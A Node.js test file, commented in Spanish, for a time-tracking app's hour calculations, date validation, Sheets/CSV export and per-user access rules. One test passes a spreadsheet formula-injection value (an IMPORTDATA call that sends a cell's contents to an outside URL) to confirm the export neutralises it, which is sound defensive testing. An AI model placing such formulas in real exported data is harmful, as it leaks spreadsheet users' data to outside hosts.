import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { registerHooks } from "node:module";

// Node no conoce el alias "@/" de Next: se traduce a la ruta del archivo .ts.
registerHooks({
  resolve(specifier, context, nextResolve) {
    if (specifier.startsWith("@/")) {
      return { url: new URL(`../${specifier.slice(2)}.ts`, import.meta.url).href, shortCircuit: true };
    }
    return nextResolve(specifier, context);
  },
});

const { minutosEntre, horasTexto, duracionTexto, mesDe, fechaValida, horaValida, paraPegarEnSheets, csvPlanilla } =
  await import("../lib/horas/tipos.ts");
const leer = (ruta) => readFileSync(new URL(ruta, import.meta.url), "utf8").replace(/\r\n/g, "\n");

const entrada = (extra = {}) => ({
  id: "1",
  user_id: "u1",
  user_name: "Bruno",
  client_id: null,
  work_date: "2026-06-10",
  start_time: "16:00",
  end_time: "20:00",
  minutes: 240,
  notes: "Configuración hosting, dominio y wordpress",
  ...extra,
});

test("minutos entre dos horas, cruzando la medianoche con tope de 16 h", () => {
  assert.equal(minutosEntre("14:00", "16:00"), 120);
  assert.equal(minutosEntre("19:00", "20:30"), 90);
  assert.equal(minutosEntre("09:15:00", "10:00:00"), 45);
  assert.equal(minutosEntre("16:00", "16:00"), null);
  // 23:20 → 05:50 termina al día siguiente: 6,5 h (carga real de Bruno).
  assert.equal(minutosEntre("23:20", "05:50"), 390);
  assert.equal(minutosEntre("00:40", "01:10"), 30);
  // Al revés por error daría 20 h: pasa el tope.
  assert.equal(minutosEntre("20:00", "16:00"), null);
  assert.equal(minutosEntre("25:00", "26:00"), null);
});

test("horas como en la planilla y duración legible", () => {
  assert.equal(horasTexto(120), "2,00");
  assert.equal(horasTexto(90), "1,50");
  assert.equal(horasTexto(50), "0,83");
  assert.equal(duracionTexto(150), "2 h 30 min");
  assert.equal(duracionTexto(120), "2 h");
  assert.equal(duracionTexto(45), "45 min");
});

test("validaciones de fecha y hora", () => {
  assert.equal(fechaValida("2026-02-30"), null);
  assert.equal(fechaValida("2026-06-10"), "2026-06-10");
  assert.equal(fechaValida("10/06/2026"), null);
  assert.equal(horaValida("09:05:00"), "09:05");
  assert.equal(horaValida("9:05"), null);
});

test("mes de una fecha, incluido febrero bisiesto", () => {
  assert.deepEqual(mesDe("2026-10-23"), { desde: "2026-10-01", hasta: "2026-10-31" });
  assert.deepEqual(mesDe("2028-02-10"), { desde: "2028-02-01", hasta: "2028-02-29" });
});

test("para pegar en Sheets: columnas de la planilla, de la más vieja a la más nueva, sin tabs ni saltos en el texto", () => {
  const t = paraPegarEnSheets([
    entrada({ id: "2", work_date: "2026-06-11", start_time: "11:00", end_time: "15:00", notes: "Desarrollo\tde la\nlanding" }),
    entrada(),
  ]);
  assert.equal(
    t,
    "10/06/2026\t16:00\t20:00\t4,00\tConfiguración hosting, dominio y wordpress\n11/06/2026\t11:00\t15:00\t4,00\tDesarrollo de la landing",
  );
});

test("lo que se pega en Sheets tampoco se ejecuta como fórmula", () => {
  const t = paraPegarEnSheets([entrada({ notes: '=IMPORTDATA("https://x/?"&A1)' })]);
  assert.ok(t.endsWith("\t'=IMPORTDATA(\"https://x/?\"&A1)"));
});

test("CSV con encabezado, BOM, comillas y sin fórmulas", () => {
  const csv = csvPlanilla([entrada({ notes: '=HYPERLINK("x")' })], false);
  assert.ok(csv.startsWith("﻿Dia,Hora de comienzo,Hora de finalización,Horas trabajadas,Comentarios sobre lo trabajado\r\n"));
  assert.ok(csv.includes('10/06/2026,16:00,20:00,"4,00","\'=HYPERLINK(""x"")"'));
  const conPersona = csvPlanilla([entrada(), entrada({ id: "2", user_name: "Laureano", work_date: "2026-06-01" })], true);
  const filas = conPersona.split("\r\n");
  assert.ok(filas[0].startsWith("﻿Persona,Dia"));
  assert.ok(filas[1].startsWith("Laureano,01/06/2026"));
  assert.ok(filas[2].startsWith("Bruno,10/06/2026"));
});

test("el equipo solo lee y toca sus horas; el dueño de una fila sale de la sesión", () => {
  const datos = leer("../lib/horas/datos.ts");
  assert.match(datos, /if \(!esOwner\) consulta = consulta\.eq\("user_id", userId\)/);
  const acciones = leer("../app/landing-pages/horas-acciones.ts");
  assert.match(acciones, /user_id: userId,/);
  assert.doesNotMatch(acciones, /texto\(fd, "user_id"\)/);
  for (const f of acciones.split("export async function ").slice(1)) {
    assert.match(f.slice(f.indexOf("{\n") + 1).trimStart(), /^const \{ userId, esOwner \} = await exigirEquipo\(\);/);
  }
  // Una carga pagada solo la toca el owner.
  assert.match(acciones, /esOwner \|\| \(data\.user_id === userId && !data\.team_payment_id\)/);
  assert.match(acciones, /\.eq\("user_id", userId\)\.is\("team_payment_id", null\)/);
  const sql = leer("../supabase/migrations/20261105000000_time_entries.sql");
  assert.match(sql, /check \(end_time > start_time\)/);
  assert.match(sql, /revoke all on table time_entries from public, anon, authenticated/);
});
